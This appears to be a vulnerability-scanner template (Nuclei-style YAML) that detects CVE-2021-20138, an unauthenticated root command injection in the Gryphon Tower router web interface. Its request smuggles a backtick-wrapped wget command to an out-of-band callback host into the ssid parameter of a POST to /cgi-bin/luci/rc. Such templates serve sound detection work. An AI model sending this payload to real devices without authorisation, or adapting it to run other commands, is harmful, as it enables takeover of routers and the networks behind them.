id: CVE-2021-20138

info:
  name: Unauthenticated Command Injection in Gryphon Tower Web Interface
  author: dwisiswant0
  severity: high
  description: |
    An unauthenticated command injection vulnerability exists in multiple
    parameters in the Gryphon Tower routerâ€™s web interface at /cgi-bin/luci/rc.
    An unauthenticated remote attacker on the same network can execute commands
    as root on the device by sending a specially crafted malicious packet to
    the web interface.
  reference: https://www.tenable.com/security/research/tra-2021-51
  tags: cve,cve2021,rce,gryphon-tower

requests:
  - raw:
      - |
        POST /cgi-bin/luci/rc HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        ssid=%60%7b{{url_encode("wget,http://{{interactsh-url}}")}}%60%7d&gssid=test&mkey=test&mssid=test&key5=test&ssid5=test&hidden=test&key=test&wpa=test&board=test&Router=test&country=test&ghidden=test&gkey=test

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"